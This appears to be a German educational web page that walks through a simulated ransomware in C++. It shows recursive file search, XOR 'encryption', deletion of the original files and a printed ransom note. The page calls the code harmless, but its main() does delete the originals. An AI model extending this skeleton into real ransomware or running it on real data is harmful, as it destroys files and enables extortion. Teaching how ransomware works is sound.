🧠 Wie funktioniert Ransomware?
(Lernprojekt mit C++)

⚠️ Wichtig: Diese Seite ist rein zu Lernzwecken erstellt. Alle C++-Beispiele sind ungefährlich und simulieren nur typische Verhaltensweisen von Ransomware – ohne Dateien zu beschädigen.

1. Was ist Ransomware?

Ransomware ist eine Art von Schadsoftware, die Dateien auf einem Computer verschlüsselt und anschließend ein Lösegeld verlangt, um sie wieder freizugeben. Das Ziel ist meist Erpressung – oft in Kryptowährung.

2. Schritt für Schritt erklärt (mit C++-Beispielen)

🔍 Dateisuche im Dateisystem

Ransomware durchsucht das Dateisystem nach bestimmten Dateitypen, z. B. .txt, .docx oder .jpg. Dabei wird rekursiv jeder Ordner durchlaufen. 

std::vector<fs::path> findFiles(const fs::path& directory) {
    std::vector<fs::path> files;
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file() && entry.path().extension() == ".txt") {
            files.push_back(entry.path());
        }
    }
    return files;
}

Diese Funktion speichert alle .txt-Dateien im angegebenen Ordner in einer Liste.

🔐 Simulierte Verschlüsselung mit XOR

Statt echter Verschlüsselung (z. B. AES) wird hier eine einfache XOR-Verschlüsselung verwendet, die leicht umkehrbar ist. Diese Methode eignet sich zum Lernen, ist aber in der Praxis unsicher. 

void xorEncryptDecrypt(const std::string& filePath, char key = 'K') {
    std::ifstream inFile(filePath, std::ios::binary);
    std::ofstream outFile(filePath + ".enc", std::ios::binary);

    char c;
    while (inFile.get(c)) {
        c ^= key; // einfacher XOR-Schlüssel
        outFile.put(c);
    }

    inFile.close();
    outFile.close();
}

Jeder Buchstabe wird mit dem Schlüssel 'K' per XOR verknüpft – dadurch entsteht eine Datei, die ohne den Schlüssel nicht lesbar ist.

🗑️ (Simuliertes) Löschen der Originaldatei

In echter Ransomware wird die Originaldatei oft gelöscht, um die Opfer zur Zahlung zu zwingen. Hier wird das Verhalten nur demonstriert: 

void deleteOriginalFile(const std::string& filePath) {
    if (fs::exists(filePath)) {
        fs::remove(filePath);
    }
}

Diese Funktion löscht die Datei, wenn sie existiert. In der Simulation solltest du sie mit Vorsicht aktivieren.

💬 Die "Lösegeld"-Nachricht

Die meisten Ransomware-Varianten hinterlassen eine Textdatei mit einer Nachricht, die zur Zahlung auffordert. 

void showRansomNote() {
    std::cout << "Deine Dateien wurden verschlüsselt!\n";
    std::cout << "Sende 0.1 BTC an: FAKE-BTC-ADDRESS\n";
}

Dies ist nur ein Textausdruck – kein echter Schaden, sondern eine Simulation für Schulungszwecke.

🧩 Hauptfunktion: Alles zusammenfügen

Die main()-Funktion verbindet alle Teile zu einem einfachen Ablauf: 

int main() {
    auto files = findFiles("./testdata");

    for (const auto& file : files) {
        xorEncryptDecrypt(file.string());
        deleteOriginalFile(file.string());
    }

    showRansomNote();
    return 0;
}

Dateien werden gesucht, "verschlüsselt" und (wenn gewollt) gelöscht – am Ende erscheint eine Warnung.
